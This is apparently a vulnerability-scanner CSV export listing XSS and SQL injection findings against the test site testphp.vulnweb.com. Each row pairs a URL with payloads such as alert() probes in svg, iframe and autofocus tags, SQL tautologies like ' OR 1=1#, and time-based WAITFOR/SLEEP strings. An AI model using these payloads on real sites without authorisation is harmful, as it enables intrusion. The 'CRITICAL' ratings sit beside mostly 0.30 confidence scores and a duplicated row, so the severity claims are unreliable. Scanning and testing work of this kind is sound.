ID,Type,Severity,Risk_Score,URL,Payload,Description,Evidence,Timestamp,Scan_ID,Confidence,Public_Facing,Auth_Required,Sensitive_Data
16,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/artists.php?artist=%3Csvg+onload%3Dalert%28%27XSS%27%29%3E,<svg onload=alert('XSS')>,Cross-Site Scripting no parâmetro 'artist',Payload refletido na resposta. Confiança: 0.30,2025-10-28T17:18:53.359118,4e4d235a,0.3,True,False,Unknown
17,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=%27%29+OR+%28%271%27%3D%271--,') OR ('1'='1--,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:53.542392,4e4d235a,0.3,True,Unknown,True
18,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=%27+OR+1%3D1%23,' OR 1=1#,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:53.786279,4e4d235a,0.3,True,Unknown,True
19,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/artists.php?artist=%3Ciframe+src%3Djavascript%3Aalert%28%27XSS%27%29%3E,<iframe src=javascript:alert('XSS')>,Cross-Site Scripting no parâmetro 'artist',Payload refletido na resposta. Confiança: 0.90,2025-10-28T17:18:53.864337,4e4d235a,0.8999999999999999,True,False,Unknown
20,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=%22+OR+%221%22%3D%221,""" OR ""1""=""1",SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:54.027642,4e4d235a,0.3,True,Unknown,True
21,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/artists.php?artist=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E,<body onload=alert('XSS')>,Cross-Site Scripting no parâmetro 'artist',Payload refletido na resposta. Confiança: 0.30,2025-10-28T17:18:54.121962,4e4d235a,0.3,True,False,Unknown
22,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=%22+OR+1%3D1--,""" OR 1=1--",SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:54.267350,4e4d235a,0.3,True,Unknown,True
23,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/artists.php?artist=%3Cdiv+onclick%3Dalert%28%27XSS%27%29%3EClick%3C%2Fdiv%3E,<div onclick=alert('XSS')>Click</div>,Cross-Site Scripting no parâmetro 'artist',Payload refletido na resposta. Confiança: 0.30,2025-10-28T17:18:54.366600,4e4d235a,0.3,True,False,Unknown
24,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=or+1%3D1--,or 1=1--,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:54.520514,4e4d235a,0.3,True,Unknown,True
25,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/artists.php?artist=%3Cinput+onfocus%3Dalert%28%27XSS%27%29+autofocus%3E,<input onfocus=alert('XSS') autofocus>,Cross-Site Scripting no parâmetro 'artist',Payload refletido na resposta. Confiança: 0.30,2025-10-28T17:18:54.614030,4e4d235a,0.3,True,False,Unknown
26,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=or+1%3D1%23,or 1=1#,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:54.762112,4e4d235a,0.3,True,Unknown,True
27,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/artists.php?artist=%3Cselect+onfocus%3Dalert%28%27XSS%27%29+autofocus%3E,<select onfocus=alert('XSS') autofocus>,Cross-Site Scripting no parâmetro 'artist',Payload refletido na resposta. Confiança: 0.30,2025-10-28T17:18:54.854741,4e4d235a,0.3,True,False,Unknown
28,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=%27+or+1%3D1+or+%27%27%3D%27,' or 1=1 or ''=',SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.90,2025-10-28T17:18:55.004826,4e4d235a,0.8999999999999999,True,Unknown,True
29,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/artists.php?artist=%3Ctextarea+onfocus%3Dalert%28%27XSS%27%29+autofocus%3E,<textarea onfocus=alert('XSS') autofocus>,Cross-Site Scripting no parâmetro 'artist',Payload refletido na resposta. Confiança: 0.30,2025-10-28T17:18:55.098422,4e4d235a,0.3,True,False,Unknown
30,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=%27+or+a%3Da--,' or a=a--,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:55.249497,4e4d235a,0.3,True,Unknown,True
31,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/artists.php?artist=%3Ckeygen+onfocus%3Dalert%28%27XSS%27%29+autofocus%3E,<keygen onfocus=alert('XSS') autofocus>,Cross-Site Scripting no parâmetro 'artist',Payload refletido na resposta. Confiança: 0.30,2025-10-28T17:18:55.339248,4e4d235a,0.3,True,False,Unknown
32,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=%27+or+%27one%27%3D%27one,' or 'one'='one,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:55.489381,4e4d235a,0.3,True,Unknown,True
33,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/artists.php?artist=%3Cvideo%3E%3Csource+onerror%3Dalert%28%27XSS%27%29%3E,<video><source onerror=alert('XSS')>,Cross-Site Scripting no parâmetro 'artist',Payload refletido na resposta. Confiança: 0.30,2025-10-28T17:18:55.586503,4e4d235a,0.3,True,False,Unknown
34,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=%27+or+%27one%27%3D%27one--,' or 'one'='one--,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:55.735273,4e4d235a,0.3,True,Unknown,True
35,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/artists.php?artist=%3Caudio+src%3Dx+onerror%3Dalert%28%27XSS%27%29%3E,<audio src=x onerror=alert('XSS')>,Cross-Site Scripting no parâmetro 'artist',Payload refletido na resposta. Confiança: 0.30,2025-10-28T17:18:55.844700,4e4d235a,0.3,True,False,Unknown
36,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=hi%27+or+%27a%27%3D%27a,hi' or 'a'='a,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:55.985494,4e4d235a,0.3,True,Unknown,True
37,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/artists.php?artist=%3Cobject+data%3Djavascript%3Aalert%28%27XSS%27%29%3E,<object data=javascript:alert('XSS')>,Cross-Site Scripting no parâmetro 'artist',Payload refletido na resposta. Confiança: 0.90,2025-10-28T17:18:56.103066,4e4d235a,0.8999999999999999,True,False,Unknown
38,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=hi%27+or+1%3D1+--,hi' or 1=1 --,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:56.310872,4e4d235a,0.3,True,Unknown,True
39,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/artists.php?artist=%3Cembed+src%3Djavascript%3Aalert%28%27XSS%27%29%3E,<embed src=javascript:alert('XSS')>,Cross-Site Scripting no parâmetro 'artist',Payload refletido na resposta. Confiança: 0.90,2025-10-28T17:18:56.354858,4e4d235a,0.8999999999999999,True,False,Unknown
40,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=hi%27+or+%27a%27%3D%27a,hi' or 'a'='a,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:56.540907,4e4d235a,0.3,True,Unknown,True
41,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/search.php?test=query,<script>alert('XSS')</script>,Cross-Site Scripting em formulário,Payload refletido via formulário. Confiança: 0.60,2025-10-28T17:18:56.733251,4e4d235a,0.6,True,Unknown,Unknown
42,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=%27%3B+waitfor+delay+%270%3A0%3A10%27--,'; waitfor delay '0:0:10'--,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:56.796352,4e4d235a,0.3,True,Unknown,True
43,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=%27%3B+WAITFOR+DELAY+%2700%3A00%3A05%27--,'; WAITFOR DELAY '00:00:05'--,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:57.121678,4e4d235a,0.3,True,Unknown,True
44,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/search.php?test=query,<img src=x onerror=alert('XSS')>,Cross-Site Scripting em formulário,Payload refletido via formulário. Confiança: 0.30,2025-10-28T17:18:57.125025,4e4d235a,0.3,True,Unknown,Unknown
45,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=%27%3B+SELECT+SLEEP%285%29--,'; SELECT SLEEP(5)--,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:57.365876,4e4d235a,0.3,True,Unknown,True
46,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/search.php?test=query,<svg onload=alert('XSS')>,Cross-Site Scripting em formulário,Payload refletido via formulário. Confiança: 0.30,2025-10-28T17:18:57.454649,4e4d235a,0.3,True,Unknown,Unknown
47,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/search.php?test=query,javascript:alert('XSS'),Cross-Site Scripting em formulário,Payload refletido via formulário. Confiança: 0.60,2025-10-28T17:18:57.938954,4e4d235a,0.6,True,Unknown,Unknown
48,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/search.php?test=query,<iframe src=javascript:alert('XSS')>,Cross-Site Scripting em formulário,Payload refletido via formulário. Confiança: 0.90,2025-10-28T17:18:58.288418,4e4d235a,0.8999999999999999,True,Unknown,Unknown
49,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/search.php?test=query,<body onload=alert('XSS')>,Cross-Site Scripting em formulário,Payload refletido via formulário. Confiança: 0.30,2025-10-28T17:18:58.655701,4e4d235a,0.3,True,Unknown,Unknown
50,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/search.php?test=query,<div onclick=alert('XSS')>Click</div>,Cross-Site Scripting em formulário,Payload refletido via formulário. Confiança: 0.30,2025-10-28T17:18:59.065038,4e4d235a,0.3,True,Unknown,Unknown
51,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/search.php?test=query,<input onfocus=alert('XSS') autofocus>,Cross-Site Scripting em formulário,Payload refletido via formulário. Confiança: 0.30,2025-10-28T17:18:59.399236,4e4d235a,0.3,True,Unknown,Unknown
52,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/search.php?test=query,<select onfocus=alert('XSS') autofocus>,Cross-Site Scripting em formulário,Payload refletido via formulário. Confiança: 0.30,2025-10-28T17:18:59.782169,4e4d235a,0.3,True,Unknown,Unknown
53,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/search.php?test=query,<textarea onfocus=alert('XSS') autofocus>,Cross-Site Scripting em formulário,Payload refletido via formulário. Confiança: 0.30,2025-10-28T17:19:00.205887,4e4d235a,0.3,True,Unknown,Unknown
